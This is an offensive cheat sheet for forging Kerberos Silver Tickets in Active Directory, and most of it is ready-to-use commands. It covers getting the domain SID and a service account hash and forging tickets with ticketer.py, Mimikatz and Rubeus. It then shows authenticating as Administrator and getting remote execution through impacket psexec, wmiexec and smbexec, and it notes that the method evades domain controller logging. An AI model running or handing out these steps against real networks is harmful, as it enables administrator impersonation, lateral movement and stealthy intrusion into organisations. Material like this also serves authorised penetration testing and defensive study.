# Silver Ticket Attack

## Objective

A **Silver Ticket** is a forged Kerberos **Ticket Granting Service (TGS)** ticket that grants access to a **specific service** on a target system without contacting the Domain Controller (KDC).

Unlike a Golden Ticket, a Silver Ticket is valid **only for the targeted service**, making it stealthier and more difficult to detect.

---

# Requirements

Before creating a Silver Ticket, you need:

- Domain SID
- Service Account NTLM hash **or** AES128/AES256 key
- Target service SPN
- Target hostname/FQDN
- Username to impersonate (commonly `Administrator`)

---

# Common Service SPNs

| Service | SPN | Authorized Access Gained | Verification |
|---------|-----|--------------------------|-------------|
| SMB | `cifs` | File shares, administrative shares | `dir \\target\C$` |
| WinRM | `wsman` | PowerShell Remoting | `Enter-PSSession -ComputerName target` |
| HTTP | `http` | IIS / Web applications | Browse web application |
| LDAP | `ldap` | Active Directory LDAP queries | `ldapsearch` |
| MSSQL | `mssqlsvc` | SQL Server access | `impacket-mssqlclient` |
| HOST | `host` | Miscellaneous host services | Depends on service |
| RPC | `rpcss` | RPC services | RPC tools |
| Exchange | `exchangeMDB` | Exchange mailbox services | Exchange tools |
| DNS | `dns` | DNS services | DNS queries |
| RDP | `termsrv` | Remote Desktop | `mstsc` |

---

# Collect Required Information

## Domain SID

### Windows

```cmd
whoami /user
```

### Linux

```bash
impacket-lookupsid <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>
```

---

## Service Account Hash

Common methods:

- Kerberoasting
- secretsdump.py
- Mimikatz
- DCSync
- LSA Secrets

Example:

```text
svc_sql:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808
```

---

# Create a Silver Ticket (Linux)

## Using NTLM Hash

```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <NTLM_HASH> -spn cifs/<TARGET_FQDN> Administrator
```

## Using AES128 Key

```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES128_KEY> -spn cifs/<TARGET_FQDN> Administrator
```

## Using AES256 Key

```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -aesKey <AES256_KEY> -spn cifs/<TARGET_FQDN> Administrator
```

Output:

```text
Administrator.ccache
```

---

# Use the Silver Ticket (Linux)

Load the generated Kerberos cache.

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

Verify the ticket.

```bash
klist
```

---

# Authenticate Using the Silver Ticket (Linux)

## SMB

```bash
impacket-smbclient -k -no-pass //<TARGET_FQDN>/C$
```

## PsExec

```bash
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>
```

## WMIExec

```bash
impacket-wmiexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>
```

## SMBExec

```bash
impacket-smbexec -k -no-pass <DOMAIN>/Administrator@<TARGET_FQDN>
```

## MSSQL

```bash
impacket-mssqlclient -k -no-pass <TARGET_FQDN>
```

---

# Create a Silver Ticket (Windows)

## Mimikatz (RC4 / NTLM)

```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /rc4:<NTLM_HASH> /user:Administrator /ptt
```

## Mimikatz (AES128)

```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /aes128:<AES128_KEY> /user:Administrator /ptt
```

## Mimikatz (AES256)

```text
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /aes256:<AES256_KEY> /user:Administrator /ptt
```

> **Note:** Mimikatz uses the `kerberos::golden` command to forge both **Golden** and **Silver** Tickets. Supplying the `/service` and `/target` parameters creates a **Silver Ticket**.

---

# Create a Silver Ticket (Rubeus)

## RC4 / NTLM

```powershell
Rubeus.exe silver /service:cifs/<TARGET_FQDN> /rc4:<NTLM_HASH> /sid:<DOMAIN_SID> /domain:<DOMAIN> /user:Administrator /ptt
```

## AES256

```powershell
Rubeus.exe silver /service:cifs/<TARGET_FQDN> /aes256:<AES256_KEY> /sid:<DOMAIN_SID> /domain:<DOMAIN> /user:Administrator /ptt
```

---

# Verify the Ticket

Windows:

```cmd
klist
```

Linux:

```bash
klist
```

---

# Verify Service Access

## SMB

```cmd
dir \\<TARGET_FQDN>\C$
```

## WinRM

```powershell
Enter-PSSession -ComputerName <TARGET_FQDN>
```

## RDP

```cmd
mstsc /v:<TARGET_FQDN>
```

## MSSQL

```bash
impacket-mssqlclient -k -no-pass <TARGET_FQDN>
```

---

# Cleanup

## Windows (Mimikatz)

```text
kerberos::purge
```

## Windows

```cmd
klist purge
```

## Linux

```bash
unset KRB5CCNAME
```

---

# Tips

- A Silver Ticket only grants access to the **specified service**.
- The Domain Controller is **not contacted** during authentication, making Silver Tickets relatively stealthy.
- CIFS (`cifs`) is the most commonly abused SPN for administrative file share access.
- Verify the service account actually owns the target SPN before forging the ticket.
- Both RC4 (NTLM) and AES keys can be used if supported by the environment.
- Always verify the ticket with `klist` before attempting authentication.

---

# Checklist

- [ ] Recover the Domain SID.
- [ ] Recover the service account NTLM hash or AES key.
- [ ] Identify the target SPN.
- [ ] Forge the Silver Ticket.
- [ ] Inject or load the ticket.
- [ ] Verify the ticket using `klist`.
- [ ] Authenticate to the target service.
- [ ] Purge the ticket after testing.
